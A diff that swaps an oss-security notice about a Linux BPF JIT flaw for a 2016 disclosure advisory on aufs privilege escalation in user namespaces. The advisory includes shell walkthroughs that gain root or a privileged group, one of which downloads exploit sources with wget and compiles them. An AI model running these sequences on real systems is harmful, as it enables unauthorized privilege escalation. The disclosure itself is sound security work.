@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1297" "Thursday" "8" "April" "2021" "16:24:26" "+0100" "Piotr Krysiuk" "piotras@gmail.com" nil "30" "[oss-security] [CVE-2021-29154] Linux kernel incorrect computation of branch displacements in BPF JIT compiler can be abused to execute arbitrary code in Kernel mode" nil nil nil "4" nil nil (number mark "U       piotras@gmai Apr  8   30/1297  " thread-indent "\"[oss-security] [CVE-2021-29154] Linux kernel incorrect computation of branch displacements in BPF JIT compiler can be abused to execute arbitrary code in Kernel mode\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [CVE-2021-29154] Linux kernel incorrect computation of branch displacements in BPF JIT compiler can be abused to execute arbitrary code in Kernel mode" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["7072" "Wednesday" "24" "February" "2016" "06:14:56" "+0000" "halfdog" "me@halfdog.net" "<80fa3a77-b8df-722e-0e9f-a0af21bfced3@halfdog.net>" "185" "[oss-security] Aufs Union Filesystem Privilege Escalation In User Namespaces" nil nil nil "2" "2016022406:14:56" "[oss-security] Aufs Union Filesystem Privilege Escalation In User Namespaces" (number mark "U       me@halfdog.n Feb 24  185/7072  " thread-indent "\"[oss-security] Aufs Union Filesystem Privilege Escalation In User Namespaces\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 20255 invoked by uid 550); 8 Apr 2021 15:30:38 -0000
+Received: (qmail 23808 invoked by uid 550); 24 Feb 2016 06:19:57 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,69 +12,199 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 16190 invoked from network); 8 Apr 2021 15:24:48 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=aQY6n7MVaOx+0xVzHKySnNGQABUZDt3uCaeTHAmr6Jc=;
-        b=dCxVfIZlFRfKrNvNLCKO3a031ZSfQOMlHefLOkWIOjW+1ATqVSvd8xCENa3efA4+7/
-         fbz5Fbh5JtH+ybV25M2cSvQxmDAX+S8wGBeV8mKG08i9Q4j6KeWuWlMl+jWC+0HtfiJ9
-         I4jYIBe0exhh03eLx625mXCzw49G80mJkHBnGpeSUB9qwKRHnaJhd12A0b7/0ZkLYz6C
-         pAZi+1NlREYd6F+ggRdU6W+KFL5CiRVFvNpHisgy9tfCKUVRiKJaDjtAysmxLdHU0sza
-         lqmOsRcIOsqBtN1YMGT5ph+dwSWJcBRwowaOBAogSKu5AmwUqjg6PLzwHV61ka/wtxk1
-         LLRw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=aQY6n7MVaOx+0xVzHKySnNGQABUZDt3uCaeTHAmr6Jc=;
-        b=PcGpQaZiYtMI8FF7yAltGmdKc5mchL6NmirrDfo0fQd7NJVSV4DqIUBHSpIoPcDmYN
-         hwcfih2Ft2Yk58i5+r3dWkfklhft89T5zCtCJPPXUQWReiEJHcse/vnRWkqGvLP3Ambu
-         OJgA67dwJCbP2DUnqol3RUE/GwyOZ/tewmlmpQt28p94QMcH3ldbyOtcf5AOYj8ag8wN
-         qrZPMph4fJurX/B2v/KB9zB2wuMZaHuct0nuLoHItarYfpUGRJZx98W0tXukCZKzCwj7
-         hYFv9hCYiImScRrk2hvv35+hTB5AxUUTok1N0Cj4AXfQQRt3BmCMRk0kNksm9yBpoHc+
-         outw==
-X-Gm-Message-State: AOAM533luQrEBPuhi2OjiGnbD8wIn4KmaWj1honShhjsEo4QAs+67u8m
-	R8C3kgfC72FJiudF6AFlw+7DiB2kIbAvZSxO3IajtdD1QDMGEjJy
-X-Google-Smtp-Source: ABdhPJxX1bs2xKnOr7emysiX9bC77uqWUGlEd0dFdvxme2ZTRYU7TkqHSOItg/YgFOwWOYvWpS1NlBVmQ+SGCldT/qo=
-X-Received: by 2002:adf:ba94:: with SMTP id p20mr12257780wrg.300.1617895476906;
- Thu, 08 Apr 2021 08:24:36 -0700 (PDT)
-MIME-Version: 1.0
-From: Piotr Krysiuk <piotras@gmail.com>
-Date: Thu, 8 Apr 2021 16:24:26 +0100
-Message-ID: <CAFzhf4pqTAOivUgVSOLw74yCOoGOS1Fm-8-xWpy-JOADMkKrKA@mail.gmail.com>
+Received: (qmail 23751 invoked from network); 24 Feb 2016 06:19:50 -0000
 To: oss-security@lists.openwall.com
-Content-Type: text/plain; charset="UTF-8"
-Subject: [oss-security] [CVE-2021-29154] Linux kernel incorrect computation of branch
- displacements in BPF JIT compiler can be abused to execute arbitrary code in
- Kernel mode
+From: halfdog <me@halfdog.net>
+Message-ID: <80fa3a77-b8df-722e-0e9f-a0af21bfced3@halfdog.net>
+Date: Wed, 24 Feb 2016 06:14:56 +0000
+User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+Subject: [oss-security] Aufs Union Filesystem Privilege Escalation In User Namespaces
 
-An issue has been discovered in the Linux kernel that can be abused by
-unprivileged local users to escalate privileges.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-The issue is with how BPF JIT compilers for some architectures compute
-branch displacements when generating machine code. This can be abused
-to craft anomalous machine code and execute it in the Kernel mode,
-where the control flow is hijacked to execute unsafe code.
+[http://www.halfdog.net/Security/2016/AufsPrivilegeEscalationInUserNamespaces/]
 
-I developed PoCs for x86-64 and x86-32 architectures to demonstrate
-shellcode execution in Kernel mode by unprivileged local users.
+Introduction:
+=============
 
-One of these PoCs has been shared privately with <security@kernel.org>
-to assist with fix development.
+* Problem description:
 
-Patches to mitigate the issue for x86-64 and x86-32 architectures are
-available. These patches do not attempt to correct the underlying
-algorithm and instead assert that all computations were performed
-correctly, such that all unsafe inputs are rejected.
+Aufs is a union filesystem to mix content of different underlying
+filesystems, e.g. read-only medium with r/w RAM-fs. That is also
+allowed in user namespaces when module was loaded with allow_userns
+option. Due to different bugs, aufs in a crafted USERNS allows
+privilege escalation, which is a problem on systems enabling
+unprivileged USERNS by default, e.g. Ubuntu Wily. All the issues
+mentioned here were discovered after performing similar analysis on
+overlayfs, another USERNS enabled union filesystem.
 
-The patches were published via BPF subsystem public git repository:
-* https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/patch/?id=e4d4d456436bfb2fe412ee2cd489f7658449b098
-* https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/patch/?id=26f55a59dc65ff77cd1c4b37991e26497fc68049
+For a system to be exposed, unprivileged USERNS has to be available
+and AUFS support enabled for it by loading the aufs module with the
+appropriate option: modprobe aufs allow_userns.
 
-# Discoverer
+AUFS Over Fuse: Loss of Nosuid:
+===============================
 
-Piotr Krysiuk <piotras@gmail.com>
+* Method:
 
-# References
+Fuse filesystem can be mounted by unprivileged users with the help of
+the fusermount SUID program. Fuse then can simulate files of any type,
+mode, UID but they are only visible to the user mounting the
+filesystem and lose all SUID properties. Those files can be exposed
+using aufs including the problematic SUID properties. The basic
+exploitation sequence is:
 
-CVE-2021-29154 (reserved via https://cveform.mitre.org/)
+    Mount fuse filesystem exposing crafted SUID binary
+    Create USERNS
+    Mount aufs on top of fuse
+    Execute the SUID binary via aufs from outside the namespace
+
+The issue can then be demonstrated using:
+
+test$ mkdir fuse mnt work
+test$ mv SuidExec RealFile
+test$ ./FuseMinimal fuse
+test$ ./UserNamespaceExec -- /bin/bash
+root$ mount -t aufs -o br=work:fuse none mnt
+root$ cd mnt
+# Now cwd of the former process is within the aufs mount. Use
+# another shell to complete.
+test$ /proc/2390/cwd/file /bin/bash
+root$ id
+uid=0(root) gid=100(users) groups=100(users)
+# Go back to old shell for cleanup.
+root$ cd ..; umount mnt; exit
+test$ fusermount -u fuse
+
+* Discussion:
+
+In my opinion, fuse filesystem allowed pretending to have files with
+different UIDs/GIDs in the local mount namespace, but they never had
+those properties, those files would have, when really stored on local
+disk. So e.g., the SUID binaries lost their SUID-properties and the
+owner could also modify arbitrary file content, even if file
+attributes were pretending, that he does not have access - by having
+control over the fuse process simulating the filesystem, such access
+control is futile. That is also the reason, why no other user than the
+one mounting the filesystem may have rights to access it by default.
+
+In my optionion the workarounds should be to restrict access to fuse
+also only to the mount namespace where it was created.
+
+AUFS Xattr Setgid Privilege Escalation:
+=======================================
+
+* Method:
+
+Due to inheritance of Posix ACL information (xattrs) when aufs is
+copying files and not cleaning those additional and unintended ACL
+attribues, SGID directories may become user writable, thus allowing to
+gain privileges of this group using methods described in [0]. Suitable
+target directories can be easily found using find / -perm -02020 2>
+/dev/null. On standard Ubuntu system those are:
+
+/usr/local/lib/python3.4 (root.staff)
+/var/lib/libuuid (libuuid.libuuid)
+/var/local (root.staff)
+/var/mail (root.mail)
+
+Exploitation can be done just combining standard tools with the
+SetgidDirectoryPrivilegeEscalation exploit [0].
+
+test$ wget -q
+http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/CreateSetgidBinary.c
+http://www.halfdog.net/Misc/Utils/UserNamespaceExec.c
+http://www.halfdog.net/Misc/Utils/SuidExec.c
+test$ gcc -o CreateSetgidBinary CreateSetgidBinary.c
+test$ gcc -o UserNamespaceExec UserNamespaceExec.c
+test$ gcc -o SuidExec SuidExec.c
+test$ mkdir mnt test
+test$ setfacl -m "d:u:$(id -u):rwx" test
+test$ ./UserNamespaceExec -- /bin/bash
+root$ mount -t aufs -o br=test:/var none mnt
+root$ chmod 07777 mnt/mail
+root$ umount mnt; exit
+test$ ./CreateSetgidBinary test/mail/escalate /bin/mount x nonexistent-arg
+test$ test/mail/escalate ./SuidExec /usr/bin/id
+uid=1000(test) gid=8(mail) groups=8(mail),100(users)
+
+On Ubuntu, exploitation allows interference with mail spool and allows
+to gain privileges of other python processes using python
+dist-packages owned by user root.staff. If root user calls a python
+process in that way, e.g. via apport crash dump tool, local root
+escalation is completed.
+
+According to this post [1], directories or binaries owned by group
+staff are in the default PATH of the root user, hence local root
+escalation is trivial.
+
+
+Results, Discussion:
+====================
+
+* Fixing the issue itself:
+
+As enabling a given file system type to be manipulated by unprivileged
+users, this will significantly increase attack surface. Thus a USERNS
+support should not be added frivolously but only after a good security
+re-audit of the codebase.
+
+* Avoiding numerous namespace issues in future:
+
+In my opinion, enabing USERNS was a little too fast, as it exposes a
+lot of additional kernel code to users without any special
+capabilities in init-ns by using the elevated privileges within the
+container. This is also recognized by others, but there is dispute on
+the consequences to draw from that. See Patch to disable unprivileged
+userns ... on LKML [2].
+
+I completely second the request to have options to disable the USERNS
+layer as it depends on the system type, if USERNS is a net gain
+regarding security or a net loss. It should be a gain on systems,
+where it allows to perform critical operations within a containment, a
+use-case where chroots are used currently. Without USERNS, those
+operations are likely to be performed with SUID helpers in the init-ns
+or privilege separation might be dropped completely as the overhead is
+too large for efficient work procedures.
+
+On the other hand, systems where all processes have similar security
+level, e.g. as they all process the same data, further privilege
+separation is not easy. The USERNS support will add only new risks here.
+
+Timeline:
+=========
+
+* 20160114: Aufs developers analyzing similar overlayfs issue [3] in [4]
+* 20160213: Discovery
+* 20160214: Report to Aufs contact mentioned on sourceforge [5]
+* 20160219: Fix released: AUFS list post [6]
+* 20161122: CRD and publication together with nearly identical
+overlayfs issue
+
+References:
+===========
+
+[0]
+http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/
+[1] http://www.openwall.com/lists/oss-security/2016/01/16/7
+[2] https://lkml.org/lkml/2016/1/22/7
+[3]
+http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
+[4] https://sourceforge.net/p/aufs/mailman/message/34766916/
+[5] https://sourceforge.net/projects/aufs/
+[6] https://sourceforge.net/p/aufs/mailman/message/34864744/
+
+- -- 
+http://www.halfdog.net/
+PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iEYEARECAAYFAlbNSlUACgkQxFmThv7tq+5bOwCfTEWEvT4hsg8DIjDa5bkSKVWx
+lAcAn3sN7LEA03OurkFl9omKLPxAZfNi
+=hQz+
+-----END PGP SIGNATURE-----
